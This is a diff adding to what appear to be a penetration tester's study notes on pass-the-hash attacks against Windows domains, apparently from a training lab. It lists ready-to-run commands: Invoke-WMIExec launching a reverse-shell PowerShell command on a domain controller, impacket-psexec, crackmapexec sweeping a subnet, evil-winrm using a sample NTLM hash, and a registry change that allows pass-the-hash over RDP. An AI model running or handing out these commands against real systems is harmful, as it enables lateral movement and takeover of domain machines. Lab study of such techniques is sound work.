@@ -16,3 +16,23 @@ Step 1) PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
 
 Step 2) PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target <IP Address of DC> -Domain <Domain> -Username <Username> -Hash <HASH> -Command "<Revers shell Powershell command>"
         We can generate the PowerShell command from URL "https://www.revshells.com/" 
+
+
+===========================================================================================================================================================================================================================
+
+Now let's see what we can do from Linux device 
+
+Option 1) Impacket can be used for PTH attack 
+        # umarkhan$ impacket-psexec <Username>@<IP address> -hashes :<HASH>
+        # umarkhan$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Option 2) CrackMapExec can be used for the same
+        # umarkhan# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+        # umarkhan# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453  --local-auth
+                         --local-auth :- If the hash is the hash of the local syatem admin not AD admin
+
+Option 3) evil-winrm for the PTH 
+        # umarkhan$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+Option 4) We can PTH from Linux to DC. Only if , c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f is disabled 
+
